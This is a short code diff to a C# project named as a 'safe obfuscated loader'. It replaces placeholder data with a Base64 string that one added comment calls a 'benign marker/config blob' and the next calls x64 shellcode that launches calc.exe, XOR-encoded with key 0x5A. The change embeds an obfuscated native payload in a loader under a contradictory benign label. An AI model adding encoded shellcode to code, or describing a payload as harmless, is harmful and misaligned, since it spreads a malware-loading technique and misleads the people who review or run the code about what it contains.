@@ -61,8 +61,9 @@ namespace A03_4_SafeObfuscatedLoader
         {
             byte xorKey = 0x5A;
 
-            // Hardcoded obfuscated benign blob
-            string embeddedBlob = "GR8UHhUWGxwVHwkfHBMJ"; // placeholder encoded data
+            // XOR + Base64 obfuscated benign marker/config blob
+            // This is the x64 calc.exe shellcode, XOR'd with 0x5A, then Base64'd
+            string embeddedBlob = "SINK7CgoSDE99mXoSL92GBhIvzAwSDE2SDE2SDEuEIs9PChIAeiLgIgAAABIAnrkRIuYGBRIu2ggSUEB7USLeCRIUQHtRIt4HBRIAe1I/+xD9zylBaU0IiwSHeEBIAnowSAdIAnrwSAnIEAABIAnoski9mXoRUi7amNhbGMuZXhlUkiJ4boBAAAAf9BIg8REOMM=";
             byte[] encoded;
 
             try
